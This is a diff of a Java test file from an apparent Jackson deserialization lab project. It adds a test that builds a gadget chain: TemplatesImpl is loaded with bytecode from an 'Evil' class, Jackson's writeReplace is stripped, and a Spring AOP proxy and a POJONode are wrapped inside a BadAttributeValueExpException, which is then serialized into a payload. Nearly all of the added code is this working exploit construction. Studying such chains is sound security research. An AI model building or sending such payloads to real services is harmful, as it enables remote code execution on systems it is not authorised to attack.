@@ -2,6 +2,7 @@ package com.endlessshw.jacksonrange;
 
 import com.endlessshw.jacksonrange.bean.User;
 import com.endlessshw.jacksonrange.util.SerializeUtil;
+import com.endlessshw.jacksonrange.util.Utils;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.databind.node.POJONode;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
@@ -29,6 +30,46 @@ import java.lang.reflect.Proxy;
  * @date 2024/10/26 14:20
  */
 public class JacksonTest {
+
+    @Test
+    public void testTemp() throws Exception{
+        // 1. 构造 sink
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.getCtClass("com.endlessshw.jacksonrange.util.Evil");
+        byte[] bytes = ctClass.toBytecode();
+        TemplatesImpl templates = new TemplatesImpl();
+        // 要求 1 - 注入恶意字节码
+        Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates, new byte[][]{bytes});
+        // 要求 2 - 保证 _name 不为 null
+        Field nameField = templates.getClass().getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates, "EndlessShw");
+
+        // 2. 移除掉 BaseJsonNode 的 writeReplace 方法，防止序列化失败
+        CtClass baseJNctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+        CtMethod writeReplace = baseJNctClass.getDeclaredMethod("writeReplace");
+        baseJNctClass.removeMethod(writeReplace);
+        baseJNctClass.toClass();
+
+        // 3. 构造 chain
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(templates);
+        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
+        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
+        POJONode jsonNodes = new POJONode(proxy);
+
+        // 4. 构造 kick-off
+        BadAttributeValueExpException toBeSerBAVEException = new BadAttributeValueExpException("123");
+        Field valField = toBeSerBAVEException.getClass().getDeclaredField("val");
+        valField.setAccessible(true);
+        valField.set(toBeSerBAVEException, jsonNodes);
+
+        String serialize = Utils.serialize(toBeSerBAVEException);
+    }
 
     @Test
     public void testJacksonChain_stable() throws Exception {
